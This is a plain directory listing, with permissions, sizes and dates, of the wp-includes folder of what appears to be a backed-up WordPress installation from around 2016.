-rw-r--r-- 1 www-data www-data 2947 Nov 20  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-nav-menu-control.php
-rw-r--r-- 1 www-data www-data 993 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-nav-menu-name-control.php
-rw-r--r-- 1 www-data www-data 998 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-header-image-setting.php
-rw-r--r-- 1 www-data www-data 2808 Dec 14  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-themes-section.php
-rw-r--r-- 1 www-data www-data 1678 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-nav-menu-location-control.php
-rw-r--r-- 1 www-data www-data 975 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-new-menu-section.php
-rw-r--r-- 1 www-data www-data 12930 Mar 16  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-selective-refresh.php
-rw-r--r-- 1 www-data www-data 1593 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-cropped-image-control.php
-rw-r--r-- 1 www-data www-data 2971 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-theme-control.php
-rw-r--r-- 1 www-data www-data 24338 Feb 25  2016 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-nav-menu-item-setting.php
-rw-r--r-- 1 www-data www-data 6869 Dec 14  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-customize-header-image-control.php
-rw-r--r-- 1 www-data www-data 1973 Oct 24  2015 /var/www/backup_wordpress/wp-includes/customize/class-wp-widget-form-customize-control.php
-rw-r--r-- 1 www-data www-data 5349 Mar 22  2016 /var/www/backup_wordpress/wp-includes/class-walker-page.php
-rw-r--r-- 1 www-data www-data 1373 Nov  7  2012 /var/www/backup_wordpress/wp-includes/images/wlw/wp-comments.png
-rw-r--r-- 1 www-data www-data 2376 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/wlw/wp-watermark.png
-rw-r--r-- 1 www-data www-data 664 Nov  7  2012 /var/www/backup_wordpress/wp-includes/images/wlw/wp-icon.png
-rw-r--r-- 1 www-data www-data 289 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/toggle-arrow.png
-rw-r--r-- 1 www-data www-data 3999 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/admin-bar-sprite-2x.png
-rw-r--r-- 1 www-data www-data 8536 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/spinner-2x.gif
-rw-r--r-- 1 www-data www-data 670 Feb 13  2014 /var/www/backup_wordpress/wp-includes/images/crystal/text.png
-rw-r--r-- 1 www-data www-data 453 Feb 13  2014 /var/www/backup_wordpress/wp-includes/images/crystal/default.png
-rw-r--r-- 1 www-data www-data 1604 Nov  7  2012 /var/www/backup_wordpress/wp-includes/images/crystal/code.png
-rw-r--r-- 1 www-data www-data 2063 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/crystal/document.png
-rw-r--r-- 1 www-data www-data 2217 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/crystal/interactive.png
-rw-r--r-- 1 www-data www-data 1339 Nov  7  2012 /var/www/backup_wordpress/wp-includes/images/crystal/video.png
-rw-r--r-- 1 www-data www-data 2454 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/crystal/archive.png
-rw-r--r-- 1 www-data www-data 2408 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/crystal/spreadsheet.png
-rw-r--r-- 1 www-data www-data 149 Mar  2  2014 /var/www/backup_wordpress/wp-includes/images/crystal/license.txt
-rw-r--r-- 1 www-data www-data 2184 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/crystal/audio.png
-rw-r--r-- 1 www-data www-data 354 Nov  7  2012 /var/www/backup_wordpress/wp-includes/images/toggle-arrow-2x.png
-rw-r--r-- 1 www-data www-data 783 Dec  5  2011 /var/www/backup_wordpress/wp-includes/images/icon-pointer-flag.png
-rw-r--r-- 1 www-data www-data 608 Nov  7  2012 /var/www/backup_wordpress/wp-includes/images/rss.png
-rw-r--r-- 1 www-data www-data 188 Mar 25  2014 /var/www/backup_wordpress/wp-includes/images/media/text.png
-rw-r--r-- 1 www-data www-data 168 Mar 25  2014 /var/www/backup_wordpress/wp-includes/images/media/default.png
-rw-r--r-- 1 www-data www-data 274 Mar 25  2014 /var/www/backup_wordpress/wp-includes/images/media/code.png
-rw-r--r-- 1 www-data www-data 200 Mar 25  2014 /var/www/backup_wordpress/wp-includes/images/media/document.png
-rw-r--r-- 1 www-data www-data 319 Mar 25  2014 /var/www/backup_wordpress/wp-includes/images/media/interactive.png
-rw-r--r-- 1 www-data www-data 283 Mar 25  2014 /var/www/backup_wordpress/wp-includes/images/media/video.png
-rw-r--r-- 1 www-data www-data 417 Mar 27  2014 /var/www/backup_wordpress/wp-includes/images/media/archive.png
-rw-r--r-- 1 www-data www-data 188 Mar 25  2014 /var/www/backup_wordpress/wp-includes/images/media/spreadsheet.png
-rw-r--r-- 1 www-data www-data 382 Mar 27  2014 /var/www/backup_wordpress/wp-includes/images/media/audio.png
-rw-r--r-- 1 www-data www-data 3542 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/uploader-icons-2x.png
-rw-r--r-- 1 www-data www-data 9133 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/wpspin-2x.gif
-rw-r--r-- 1 www-data www-data 1369 Sep 26  2012 /var/www/backup_wordpress/wp-includes/images/icon-pointer-flag-2x.png
-rw-r--r-- 1 www-data www-data 1666 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/arrow-pointer-blue-2x.png
-rw-r--r-- 1 www-data www-data 825 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/xit-2x.gif
-rw-r--r-- 1 www-data www-data 2467 Feb 13  2014 /var/www/backup_wordpress/wp-includes/images/admin-bar-sprite.png
-rw-r--r-- 1 www-data www-data 1556 Feb 13  2014 /var/www/backup_wordpress/wp-includes/images/uploader-icons.png
-rw-r--r-- 1 www-data www-data 7086 Nov 24  2014 /var/www/backup_wordpress/wp-includes/images/wpicons.png
-rw-r--r-- 1 www-data www-data 43 Nov 24  2014 /var/www/backup_wordpress/wp-includes/images/blank.gif
-rw-r--r-- 1 www-data www-data 793 Nov  7  2012 /var/www/backup_wordpress/wp-includes/images/arrow-pointer-blue.png
-rw-r--r-- 1 www-data www-data 241 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_evil.gif
-rw-r--r-- 1 www-data www-data 348 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_mrgreen.gif
-rw-r--r-- 1 www-data www-data 170 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_confused.gif
-rw-r--r-- 1 www-data www-data 167 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_sad.gif
-rw-r--r-- 1 www-data www-data 175 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_razz.gif
-rw-r--r-- 1 www-data www-data 1008 Apr  9  2015 /var/www/backup_wordpress/wp-includes/images/smilies/simple-smile.png
-rw-r--r-- 1 www-data www-data 174 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_surprised.gif
-rw-r--r-- 1 www-data www-data 169 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_arrow.gif
-rw-r--r-- 1 www-data www-data 490 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_cry.gif
-rw-r--r-- 1 www-data www-data 236 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_exclaim.gif
-rw-r--r-- 1 www-data www-data 172 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_cool.gif
-rw-r--r-- 1 www-data www-data 1233 Apr  9  2015 /var/www/backup_wordpress/wp-includes/images/smilies/rolleyes.png
-rw-r--r-- 1 www-data www-data 174 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_idea.gif
-rw-r--r-- 1 www-data www-data 247 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_question.gif
-rw-r--r-- 1 www-data www-data 650 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_redface.gif
-rw-r--r-- 1 www-data www-data 241 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_twisted.gif
-rw-r--r-- 1 www-data www-data 489 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_rolleyes.gif
-rw-r--r-- 1 www-data www-data 167 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_neutral.gif
-rw-r--r-- 1 www-data www-data 173 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_biggrin.gif
-rw-r--r-- 1 www-data www-data 1486 Apr  9  2015 /var/www/backup_wordpress/wp-includes/images/smilies/mrgreen.png
-rw-r--r-- 1 www-data www-data 170 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_eek.gif
-rw-r--r-- 1 www-data www-data 172 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_mad.gif
-rw-r--r-- 1 www-data www-data 333 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_lol.gif
-rw-r--r-- 1 www-data www-data 168 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_wink.gif
-rw-r--r-- 1 www-data www-data 173 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/smilies/icon_smile.gif
-rw-r--r-- 1 www-data www-data 1007 Apr  9  2015 /var/www/backup_wordpress/wp-includes/images/smilies/frownie.png
-rw-r--r-- 1 www-data www-data 59 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/down_arrow.gif
-rw-r--r-- 1 www-data www-data 181 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/xit.gif
-rw-r--r-- 1 www-data www-data 1306 Nov  7  2012 /var/www/backup_wordpress/wp-includes/images/rss-2x.png
-rw-r--r-- 1 www-data www-data 2209 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/wpspin.gif
-rw-r--r-- 1 www-data www-data 3113 Feb 23  2016 /var/www/backup_wordpress/wp-includes/images/w-logo-blue.png
-rw-r--r-- 1 www-data www-data 4162 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/spinner.gif
-rw-r--r-- 1 www-data www-data 84 Oct 28  2014 /var/www/backup_wordpress/wp-includes/images/down_arrow-2x.gif
-rw-r--r-- 1 www-data www-data 14931 Nov 24  2014 /var/www/backup_wordpress/wp-includes/images/wpicons-2x.png
-rw-r--r-- 1 www-data www-data 23380 Mar 16  2016 /var/www/backup_wordpress/wp-includes/update.php
-rw-r--r-- 1 www-data www-data 15221 Jan 27  2016 /var/www/backup_wordpress/wp-includes/author-template.php
-rw-r--r-- 1 www-data www-data 50105 Feb  6  2016 /var/www/backup_wordpress/wp-includes/kses.php
-rw-r--r-- 1 www-data www-data 5948 Nov 19  2015 /var/www/backup_wordpress/wp-includes/pomo/streams.php
-rw-r--r-- 1 www-data www-data 2887 Nov 19  2015 /var/www/backup_wordpress/wp-includes/pomo/entry.php
-rw-r--r-- 1 www-data www-data 8778 Nov 19  2015 /var/www/backup_wordpress/wp-includes/pomo/translations.php
-rw-r--r-- 1 www-data www-data 8180 Nov 19  2015 /var/www/backup_wordpress/wp-includes/pomo/mo.php
-rw-r--r-- 1 www-data www-data 13219 Nov 19  2015 /var/www/backup_wordpress/wp-includes/pomo/po.php
-rw-r--r-- 1 www-data www-data 4671 Feb 26  2016 /var/www/backup_wordpress/wp-includes/class-feed.php
-rw-r--r-- 1 www-data www-data 1995 Mar 22  2016 /var/www/backup_wordpress/wp-includes/class-wp-widget-factory.php
-rw-r--r-- 1 www-data www-data 23305 Aug 25  2015 /var/www/backup_wordpress/wp-includes/rss.php
-rw-r--r-- 1 www-data www-data 57156 Apr  9  2016 /var/www/backup_wordpress/wp-includes/script-loader.php
-rw-r--r-- 1 www-data www-data 970 Mar 28  2016 /var/www/backup_wordpress/wp-includes/theme-compat/embed-404.php
-rw-r--r-- 1 www-data www-data 437 Mar 28  2016 /var/www/backup_wordpress/wp-includes/theme-compat/footer-embed.php
-rw-r--r-- 1 www-data www-data 479 Mar 28  2016 /var/www/backup_wordpress/wp-includes/theme-compat/embed.php
-rw-r--r-- 1 www-data www-data 3086 Mar 28  2016 /var/www/backup_wordpress/wp-includes/theme-compat/embed-content.php
-rw-r--r-- 1 www-data www-data 703 Mar 28  2016 /var/www/backup_wordpress/wp-includes/theme-compat/header-embed.php
-rw-r--r-- 1 www-data www-data 4059 Feb 20  2016 /var/www/backup_wordpress/wp-includes/theme-compat/sidebar.php
-rw-r--r-- 1 www-data www-data 2109 Feb 20  2016 /var/www/backup_wordpress/wp-includes/theme-compat/comments.php
-rw-r--r-- 1 www-data www-data 1059 Feb 20  2016 /var/www/backup_wordpress/wp-includes/theme-compat/footer.php
-rw-r--r-- 1 www-data www-data 1892 Oct 30  2015 /var/www/backup_wordpress/wp-includes/theme-compat/header.php
-rw-r--r-- 1 www-data www-data 37690 Mar 21  2016 /var/www/backup_wordpress/wp-includes/class-wp-customize-nav-menus.php
-rw-r--r-- 1 www-data www-data 45498 Nov  7  2015 /var/www/backup_wordpress/wp-includes/media-template.php
-rw-r--r-- 1 www-data www-data 9639 Mar  2  2016 /var/www/backup_wordpress/wp-includes/class-wp-customize-panel.php
-rw-r--r-- 1 www-data www-data 5426 Jan  9  2016 /var/www/backup_wordpress/wp-includes/class-wp-term.php
-rw-r--r-- 1 www-data www-data 59964 Mar 10  2016 /var/www/backup_wordpress/wp-includes/class-wp-rewrite.php
-rw-r--r-- 1 www-data www-data 170655 Mar 30  2016 /var/www/backup_wordpress/wp-includes/taxonomy.php
-rw-r--r-- 1 www-data www-data 2738 Dec 14  2015 /var/www/backup_wordpress/wp-includes/class-wp-role.php
-rw-r--r-- 1 www-data www-data 35249 Dec  6  2015 /var/www/backup_wordpress/wp-includes/date.php
-rw-r--r-- 1 www-data www-data 92366 Mar 27  2016 /var/www/backup_wordpress/wp-includes/wp-db.php
-rw-r--r-- 1 www-data www-data 13212 Feb  6  2016 /var/www/backup_wordpress/wp-includes/compat.php
-rw-r--r-- 1 www-data www-data 11730 Mar 12  2016 /var/www/backup_wordpress/wp-includes/class-wp-http-curl.php
-rw-r--r-- 1 www-data www-data 3899 Feb  6  2016 /var/www/backup_wordpress/wp-includes/class-wp-site.php
-rw-r--r-- 1 www-data www-data 12045 Feb 22  2016 /var/www/backup_wordpress/wp-includes/class-wp-image-editor.php
-rw-r--r-- 1 www-data www-data 5991 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Registry.php
-rw-r--r-- 1 www-data www-data 17321 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Decode/HTML/Entities.php
-rw-r--r-- 1 www-data www-data 3367 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Copyright.php
-rw-r--r-- 1 www-data www-data 20539 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Source.php
-rw-r--r-- 1 www-data www-data 4296 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Cache.php
-rw-r--r-- 1 www-data www-data 3451 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Rating.php
-rw-r--r-- 1 www-data www-data 11185 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Locator.php
-rw-r--r-- 1 www-data www-data 28359 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/IRI.php
-rw-r--r-- 1 www-data www-data 3452 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Cache/Base.php
-rw-r--r-- 1 www-data www-data 4424 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Cache/File.php
-rw-r--r-- 1 www-data www-data 12280 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Cache/MySQL.php
-rw-r--r-- 1 www-data www-data 4726 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Cache/DB.php
-rw-r--r-- 1 www-data www-data 5141 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Cache/Memcache.php
-rw-r--r-- 1 www-data www-data 4510 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Caption.php
-rw-r--r-- 1 www-data www-data 9678 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/File.php
-rw-r--r-- 1 www-data www-data 51550 Jul  8  2013 /var/www/backup_wordpress/wp-includes/SimplePie/Misc.php
-rw-r--r-- 1 www-data www-data 2268 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Core.php
-rw-r--r-- 1 www-data www-data 3707 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Category.php
-rw-r--r-- 1 www-data www-data 3800 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Restriction.php
-rw-r--r-- 1 www-data www-data 19701 Oct 19  2015 /var/www/backup_wordpress/wp-includes/SimplePie/Parse/Date.php
-rw-r--r-- 1 www-data www-data 2187 Nov  8  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Exception.php
-rw-r--r-- 1 www-data www-data 15698 Sep 10  2013 /var/www/backup_wordpress/wp-includes/SimplePie/Sanitize.php
-rw-r--r-- 1 www-data www-data 98299 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Item.php
-rw-r--r-- 1 www-data www-data 7576 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Net/IPv6.php
-rw-r--r-- 1 www-data www-data 10882 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/HTTP/Parser.php
-rw-r--r-- 1 www-data www-data 3592 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Author.php
-rw-r--r-- 1 www-data www-data 8137 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Content/Type/Sniffer.php
-rw-r--r-- 1 www-data www-data 8572 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/gzdecode.php
-rw-r--r-- 1 www-data www-data 11851 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Parser.php
-rw-r--r-- 1 www-data www-data 27487 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Enclosure.php
-rw-r--r-- 1 www-data www-data 3721 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/Credit.php
-rw-r--r-- 1 www-data www-data 7149 Nov 21  2012 /var/www/backup_wordpress/wp-includes/SimplePie/XML/Declaration/Parser.php
-rw-r--r-- 1 www-data www-data 84285 Mar 17  2016 /var/www/backup_wordpress/wp-includes/pluggable.php
-rw-r--r-- 1 www-data www-data 35149 Dec 30  2015 /var/www/backup_wordpress/wp-includes/class-IXR.php
-rw-r--r-- 1 www-data www-data 5073 Mar 18  2016 /var/www/backup_wordpress/wp-includes/class-wp-ajax-response.php
-rw-r--r-- 1 www-data www-data 206318 Apr  7  2016 /var/www/backup_wordpress/wp-includes/post.php
-rw-r--r-- 1 www-data www-data 4469 Sep 16  2015 /var/www/backup_wordpress/wp-includes/ms-default-filters.php
-rw-r--r-- 1 www-data www-data 5868 Oct 14  2015 /var/www/backup_wordpress/wp-includes/class-wp-post.php
-rw-r--r-- 1 www-data www-data 15220 Jan 14  2016 /var/www/backup_wordpress/wp-includes/cron.php
-rw-r--r-- 1 www-data www-data 66974 Mar 29  2016 /var/www/backup_wordpress/wp-includes/theme.php
-rw-r--r-- 1 www-data www-data 6751 Mar 22  2016 /var/www/backup_wordpress/wp-includes/class-walker-category.php
-rw-r--r-- 1 www-data www-data 37783 Mar 30  2016 /var/www/backup_wordpress/wp-includes/class-snoopy.php
-rw-r--r-- 1 www-data www-data 5485 Mar  9  2016 /var/www/backup_wordpress/wp-includes/class-wp-metadata-lazyloader.php
-rw-r--r-- 1 www-data www-data 20378 Feb 23  2016 /var/www/backup_wordpress/wp-includes/revision.php
-rw-r--r-- 1 www-data www-data 2662 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-search.php
-rw-r--r-- 1 www-data www-data 5086 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-nav-menu-widget.php
-rw-r--r-- 1 www-data www-data 3749 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-rss.php
-rw-r--r-- 1 www-data www-data 6982 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-links.php
-rw-r--r-- 1 www-data www-data 4117 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-text.php
-rw-r--r-- 1 www-data www-data 5801 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-recent-comments.php
-rw-r--r-- 1 www-data www-data 4793 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-pages.php
-rw-r--r-- 1 www-data www-data 5670 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-categories.php
-rw-r--r-- 1 www-data www-data 2946 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-calendar.php
-rw-r--r-- 1 www-data www-data 3505 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-meta.php
-rw-r--r-- 1 www-data www-data 4823 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-recent-posts.php
-rw-r--r-- 1 www-data www-data 5085 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-tag-cloud.php
-rw-r--r-- 1 www-data www-data 5197 Mar 21  2016 /var/www/backup_wordpress/wp-includes/widgets/class-wp-widget-archives.php
-rw-r--r-- 1 www-data www-data 14656 Dec 16  2015 /var/www/backup_wordpress/wp-includes/locale.php
-rw-r--r-- 1 www-data www-data 52416 Jan  8  2016 /var/www/backup_wordpress/wp-includes/option.php
-rw-r--r-- 1 www-data www-data 11114 Jun 28  2015 /var/www/backup_wordpress/wp-includes/atomlib.php
-rw-r--r-- 1 www-data www-data 9439 Jan 17  2016 /var/www/backup_wordpress/wp-includes/class-wp-comment.php
-rw-r--r-- 1 www-data www-data 13544 Oct 31  2015 /var/www/backup_wordpress/wp-includes/class-wp-image-editor-gd.php
-rw-r--r-- 1 www-data www-data 158511 Mar 16  2016 /var/www/backup_wordpress/wp-includes/formatting.php
-rw-r--r-- 1 www-data www-data 2047 Nov 17  2015 /var/www/backup_wordpress/wp-includes/class-wp-oembed-controller.php
-rw-r--r-- 1 www-data www-data 176 Jan  8  2012 /var/www/backup_wordpress/wp-includes/registration.php
-rw-r--r-- 1 www-data www-data 18663 Feb  6  2016 /var/www/backup_wordpress/wp-includes/capabilities.php
-rw-r--r-- 1 www-data www-data 4942 Oct 20  2015 /var/www/backup_wordpress/wp-includes/feed-atom-comments.php
-rw-r--r-- 1 www-data www-data 26772 Jan  8  2016 /var/www/backup_wordpress/wp-includes/canonical.php
-rw-r--r-- 1 www-data www-data 9217 Dec 22  2015 /var/www/backup_wordpress/wp-includes/default-constants.php
-rw-r--r-- 1 www-data www-data 142700 Mar 23  2016 /var/www/backup_wordpress/wp-includes/query.php
-rw-r--r-- 1 www-data www-data 11220 Mar 22  2016 /var/www/backup_wordpress/wp-includes/class-walker-comment.php
-rw-r--r-- 1 www-data www-data 3656 Oct 20  2015 /var/www/backup_wordpress/wp-includes/feed-rss2-comments.php
-rw-r--r-- 1 www-data www-data 5325 Mar  2  2016 /var/www/backup_wordpress/wp-includes/vars.php
-rw-r--r-- 1 www-data www-data 617 Apr 12  2016 /var/www/backup_wordpress/wp-includes/version.php
-rw-r--r-- 1 www-data www-data 25550 Mar  9  2016 /var/www/backup_wordpress/wp-includes/class-wp.php
-rw-r--r-- 1 www-data www-data 2611 Jun 16  2015 /var/www/backup_wordpress/wp-includes/ms-files.php
-rw-r--r-- 1 www-data www-data 25471 Mar  9  2016 /var/www/backup_wordpress/wp-includes/admin-bar.php
-rw-r--r-- 1 www-data www-data 15826 Mar 10  2016 /var/www/backup_wordpress/wp-includes/template.php
-rw-r--r-- 1 www-data www-data 1974 Dec 18  2015 /var/www/backup_wordpress/wp-includes/css/wp-auth-check.min.css
-rw-r--r-- 1 www-data www-data 4799 Mar 23  2016 /var/www/backup_wordpress/wp-includes/css/jquery-ui-dialog-rtl.min.css
-rw-r--r-- 1 www-data www-data 2594 Dec 18  2015 /var/www/backup_wordpress/wp-includes/css/wp-auth-check-rtl.css
-rw-r--r-- 1 www-data www-data 49808 Mar  9  2016 /var/www/backup_wordpress/wp-includes/css/media-views.css
-rw-r--r-- 1 www-data www-data 49806 Mar  9  2016 /var/www/backup_wordpress/wp-includes/css/media-views-rtl.css
-rw-r--r-- 1 www-data www-data 1438 Oct 30  2015 /var/www/backup_wordpress/wp-includes/css/wp-embed-template-ie.min.css
-rw-r--r-- 1 www-data www-data 6226 Mar 23  2016 /var/www/backup_wordpress/wp-includes/css/jquery-ui-dialog.css
-rw-r--r-- 1 www-data www-data 6230 Mar 23  2016 /var/www/backup_wordpress/wp-includes/css/jquery-ui-dialog-rtl.css
-rw-r--r-- 1 www-data www-data 8051 Oct 30  2015 /var/www/backup_wordpress/wp-includes/css/wp-embed-template.css
-rw-r--r-- 1 www-data www-data 3878 Mar  9  2016 /var/www/backup_wordpress/wp-includes/css/wp-pointer-rtl.css
-rw-r--r-- 1 www-data www-data 221 Mar  8  2016 /var/www/backup_wordpress/wp-includes/css/customize-preview.min.css
-rw-r--r-- 1 www-data www-data 27712 Apr 11  2016 /var/www/backup_wordpress/wp-includes/css/editor-rtl.min.css
-rw-r--r-- 1 www-data www-data 3058 Mar  9  2016 /var/www/backup_wordpress/wp-includes/css/wp-pointer.min.css
-rw-r--r-- 1 www-data www-data 27706 Apr 11  2016 /var/www/backup_wordpress/wp-includes/css/editor.min.css
-rw-r--r-- 1 www-data www-data 3873 Mar  9  2016 /var/www/backup_wordpress/wp-includes/css/wp-pointer.css
-rw-r--r-- 1 www-data www-data 6360 Nov 18  2015 /var/www/backup_wordpress/wp-includes/css/buttons-rtl.min.css
-rw-r--r-- 1 www-data www-data 19945 Feb 22  2016 /var/www/backup_wordpress/wp-includes/css/admin-bar-rtl.min.css
-rw-r--r-- 1 www-data www-data 4796 Mar 23  2016 /var/www/backup_wordpress/wp-includes/css/jquery-ui-dialog.min.css
-rw-r--r-- 1 www-data www-data 1477 Oct 30  2015 /var/www/backup_wordpress/wp-includes/css/wp-embed-template-ie.css
-rw-r--r-- 1 www-data www-data 7036 Nov  5  2015 /var/www/backup_wordpress/wp-includes/css/wp-embed-template.min.css
-rw-r--r-- 1 www-data www-data 9710 Mar 23  2016 /var/www/backup_wordpress/wp-includes/css/buttons.css
-rw-r--r-- 1 www-data www-data 46364 Mar 18  2016 /var/www/backup_wordpress/wp-includes/css/dashicons.min.css
-rw-r--r-- 1 www-data www-data 3063 Mar  9  2016 /var/www/backup_wordpress/wp-includes/css/wp-pointer-rtl.min.css
-rw-r--r-- 1 www-data www-data 292 Mar  8  2016 /var/www/backup_wordpress/wp-includes/css/customize-preview.css
-rw-r--r-- 1 www-data www-data 41569 Mar  9  2016 /var/www/backup_wordpress/wp-includes/css/media-views-rtl.min.css
-rw-r--r-- 1 www-data www-data 1976 Dec 18  2015 /var/www/backup_wordpress/wp-includes/css/wp-auth-check-rtl.min.css
-rw-r--r-- 1 www-data www-data 6361 Nov 18  2015 /var/www/backup_wordpress/wp-includes/css/buttons.min.css
-rw-r--r-- 1 www-data www-data 41571 Mar  9  2016 /var/www/backup_wordpress/wp-includes/css/media-views.min.css
-rw-r--r-- 1 www-data www-data 33684 Apr 11  2016 /var/www/backup_wordpress/wp-includes/css/editor.css
-rw-r--r-- 1 www-data www-data 48855 Mar 18  2016 /var/www/backup_wordpress/wp-includes/css/dashicons.css
-rw-r--r-- 1 www-data www-data 9709 Mar 23  2016 /var/www/backup_wordpress/wp-includes/css/buttons-rtl.css
-rw-r--r-- 1 www-data www-data 24936 Feb 22  2016 /var/www/backup_wordpress/wp-includes/css/admin-bar-rtl.css
-rw-r--r-- 1 www-data www-data 33689 Apr 11  2016 /var/www/backup_wordpress/wp-includes/css/editor-rtl.css
-rw-r--r-- 1 www-data www-data 24930 Feb 22  2016 /var/www/backup_wordpress/wp-includes/css/admin-bar.css
-rw-r--r-- 1 www-data www-data 19934 Feb 22  2016 /var/www/backup_wordpress/wp-includes/css/admin-bar.min.css
-rw-r--r-- 1 www-data www-data 2592 Dec 18  2015 /var/www/backup_wordpress/wp-includes/css/wp-auth-check.css
-rw-r--r-- 1 www-data www-data 3249 Sep 15  2015 /var/www/backup_wordpress/wp-includes/class-wp-http-ixr-client.php
-rw-r--r-- 1 www-data www-data 14676 Apr  9  2016 /var/www/backup_wordpress/wp-includes/class.wp-scripts.php
-rw-r--r-- 1 www-data www-data 40037 Mar  3  2016 /var/www/backup_wordpress/wp-includes/class-wp-comment-query.php
-rw-r--r-- 1 www-data www-data 189 Sep 24  2013 /var/www/backup_wordpress/wp-includes/rss-functions.php
-rw-r--r-- 1 www-data www-data 17871 Mar 22  2016 /var/www/backup_wordpress/wp-includes/class-wp-widget.php
-rw-r--r-- 1 www-data www-data 6969 Jan 27  2016 /var/www/backup_wordpress/wp-includes/class-wp-roles.php
-rw-r--r-- 1 www-data www-data 7317 Oct  6  2015 /var/www/backup_wordpress/wp-includes/class-phpass.php
-rw-r--r-- 1 www-data www-data 12381 Dec 11  2015 /var/www/backup_wordpress/wp-includes/class-wp-walker.php
